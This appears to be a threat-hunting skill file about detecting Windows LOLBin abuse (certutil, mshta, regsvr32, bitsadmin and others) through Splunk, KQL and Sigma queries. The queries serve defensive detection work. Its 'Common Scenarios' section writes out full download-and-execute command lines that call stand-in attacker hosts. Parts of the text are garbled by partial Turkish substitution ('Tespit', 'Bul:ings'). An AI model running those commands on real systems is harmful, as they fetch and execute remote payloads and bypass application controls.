---
name: hunting-for-lolbins-execution-in-endpoint-logs
description: Hunt for adversary abuse of Living Off the Land Binaries (LOLBins) by analyzing endpoint process creation logs for suspicious execution patterns of legitimate Windows system binaries used for
  malicious purposes.
tags:
- threat-hunting
- lolbins
- living-off-the-land
- process-monitoring
- fetih
- cybersecurity
- defense-evasion
- endpoint-Tespit
- siber-güvenlik
- mitre-t1218
triggers:
- alert
- anomali tespit
- endpoint
- execution
- hash
- http
- hunting
- log
- logs
- lolbins
- malware
- network
category: threat-hunting
source_subdomain: threat-hunting
nist_csf:
- DE.CM-01
- DE.AE-02
- DE.AE-07
- ID.RA-05
---

# Hunting for Lolbins Execution in Endpoint Logs


## Ne Zaman Kullanılır

- hunting yaparken for fileless attack techniques that abuse built-in Windows binaries
- threat intelligence sonrasında indicates LOLBin-based campaigns targeting your industry
- investigating yaparken alerts for suspicious use of certutil, mshta, rundll32, or regsvr32
- During purple team exercises testing Tespit of defense evasion techniques
- assessing yaparken endpoint Tespit coverage for MITRE ATT&CK T1218 sub-techniques

## Ön Gereksinimler

- Sysmon Event ID 1 (Process Creation) with full command-line logging
- Windows Security Event ID 4688 with command-line auditing enabled
- EDR telemetry with parent-child process relationships
- SIEM platform for query and correlation (Splunk, Elastic, Microsoft Sentinel)
- LOLBAS project reference (lolbas-project.github.io) for known abuse patterns

## İş Akışı

1. **Build LOLBin Watchlist**: Compile a list of high-risk LOLBins from the LOLBAS project, prioritizing: certutil.exe, mshta.exe, rundll32.exe, regsvr32.exe, msbuild.exe, installutil.exe, cmstp.exe, wmic.exe, wscript.exe, cscript.exe, bitsadmin.exe, and powershell.exe.
2. **Baseline Normal Usage**: Establish what normal LOLBin usage looks like in your environment by profiling command-line arguments, parent processes, and user contexts for each binary over 30 days.
3. **Hunt for Anomalous Arguments**: Ara: LOLBins executed with unusual command-line arguments indicating abuse -- certutil with `-urlcache -decode -encode`, mshta with URL arguments, rundll32 loading DLLs from temp/user directories, regsvr32 with `/s /n /u /i:URL`.
4. **Analyze Parent-Child Relationships**: Identify unexpected parent processes spawning LOLBins -- for example, outlook.exe spawning mshta.exe, or winword.exe spawning certutil.exe indicates weaponized document delivery.
5. **Check Execution from Unusual Paths**: LOLBins executed from non-standard paths (copies placed in %TEMP%, user profile directories) suggest renamed binary abuse.
6. **Correlate with Network Activity**: Map LOLBin execution to outbound network connections (Sysmon Event ID 3) to identify download cradles and C2 callbacks.
7. **Score and Prioritize**: Rank Bul:ings by anomaly severity, combining suspicious arguments, unusual parent process, non-standard path, and network activity indicators.

## Key Concepts

| Concept | Description |
|---------|-------------|
| T1218 | System Binary Proxy Execution |
| T1218.001 | Compiled HTML File (mshta.exe) |
| T1218.003 | CMSTP |
| T1218.005 | Mshta |
| T1218.010 | Regsvr32 (Squiblydoo) |
| T1218.011 | Rundll32 |
| T1127.001 | MSBuild |
| T1197 | BITS Jobs (bitsadmin.exe) |
| T1140 | Deobfuscate/Decode Files (certutil.exe) |
| T1059.001 | PowerShell |
| T1059.005 | Visual Basic (wscript/cscript) |
| LOLBAS | Living Off the Land Binaries, Scripts and Libraries project |

## Tools & Systems

| Tool | Purpose |
|------|---------|
| Sysmon | Process creation with command-line and hash logging |
| CrowdStrike Falcon | EDR with LOLBin Tespit analytics |
| Microsoft Defender for Endpoint | Built-in LOLBin abuse Tespit |
| Splunk | SPL-based process hunting and anomaly Tespit |
| Elastic Security | Pre-built LOLBin Tespit rules |
| LOLBAS Project | Reference database of LOLBin abuse techniques |
| Sigma Rules | Community Tespit rules for LOLBin abuse |

## Tespit Queries

### Splunk -- High-Risk LOLBin Execution
```spl
index=sysmon EventCode=1
| where match(Image, "(?i)(certutil|mshta|rundll32|regsvr32|msbuild|installutil|cmstp|bitsadmin)\.exe$")
| eval suspicious=case(
    match(CommandLine, "(?i)certutil.*(-urlcache|-decode|-encode)"), "certutil_download_decode",
    match(CommandLine, "(?i)mshta.*(http|https|javascript|vbscript)"), "mshta_remote_exec",
    match(CommandLine, "(?i)rundll32.*\\\\(temp|appdata|users)"), "rundll32_unusual_dll",
    match(CommandLine, "(?i)regsvr32.*/s.*/n.*/u.*/i:"), "regsvr32_squiblydoo",
    match(CommandLine, "(?i)msbuild.*\\\\(temp|appdata|users)"), "msbuild_unusual_project",
    match(CommandLine, "(?i)bitsadmin.*/transfer"), "bitsadmin_download",
    match(CommandLine, "(?i)cmstp.*/s.*/ni"), "cmstp_uac_bypass",
    1=1, "normal"
)
| where suspicious!="normal"
| table _time Computer User Image CommandLine ParentImage ParentCommandLine suspicious
```

### KQL -- Microsoft Sentinel LOLBin Hunting
```kql
DeviceProcessEvents
| where Timestamp > ago(7d)
| where FileName in~ ("certutil.exe", "mshta.exe", "rundll32.exe", "regsvr32.exe",
    "msbuild.exe", "installutil.exe", "cmstp.exe", "bitsadmin.exe")
| where ProcessCommandLine matches regex @"(?i)(urlcache|decode|encode|http://|https://|javascript:|vbscript:|/s\s+/n|/transfer)"
| project Timestamp, DeviceName, AccountName, FileName, ProcessCommandLine,
    InitiatingProcessFileName, InitiatingProcessCommandLine
| sort by Timestamp desc
```

### Sigma Rule -- Suspicious LOLBin Command Line
```yaml
title: Suspicious LOLBin Execution with Malicious Arguments
status: experimental
logsource:
    category: process_creation
    product: windows
Tespit:
    selection_certutil:
        Image|endswith: '\certutil.exe'
        CommandLine|contains:
            - '-urlcache'
            - '-decode'
            - '-encode'
    selection_mshta:
        Image|endswith: '\mshta.exe'
        CommandLine|contains:
            - 'http://'
            - 'https://'
            - 'javascript:'
    selection_regsvr32:
        Image|endswith: '\regsvr32.exe'
        CommandLine|contains|all:
            - '/s'
            - '/i:'
    condition: 1 of selection_*
level: high
tags:
    - attack.defense_evasion
    - attack.t1218
```

## Common Scenarios

1. **Certutil Download Cradle**: `certutil.exe -urlcache -split -f http://malicious.com/payload.exe %TEMP%\payload.exe` used to download malware bypassing proxy filters.
2. **Mshta HTA Execution**: `mshta.exe http://attacker.com/malicious.hta` executing remote HTA files containing VBScript or JScript payloads.
3. **Regsvr32 Squiblydoo**: `regsvr32 /s /n /u /i:http://attacker.com/file.sct scrobj.dll` executing remote SCT files to bypass application whitelisting.
4. **Rundll32 DLL Proxy**: `rundll32.exe C:\Users\user\AppData\Local\Temp\malicious.dll,EntryPoint` executing attacker DLLs via legitimate binary.
5. **MSBuild Inline Task**: `msbuild.exe C:\Temp\malicious.csproj` executing C# code embedded in project files to bypass application control.
6. **BITS Transfer**: `bitsadmin /transfer job /download /priority high http://attacker.com/malware.exe C:\Temp\update.exe` using BITS service for stealthy file download.
7. **WMIC XSL Execution**: `wmic process list /format:evil.xsl` executing JScript/VBScript from XSL stylesheets.

## Output Format

```
Hunt ID: TH-LOLBIN-[DATE]-[SEQ]
Host: [Hostname]
User: [Account context]
LOLBin: [Binary name]
Full Path: [Execution path]
Command Line: [Full arguments]
Parent Process: [Parent image and command line]
Tespit Category: [download_cradle/proxy_exec/uac_bypass/applocker_bypass]
Network Activity: [Yes/No -- destination if applicable]
Risk Level: [Critical/High/Medium/Low]
```
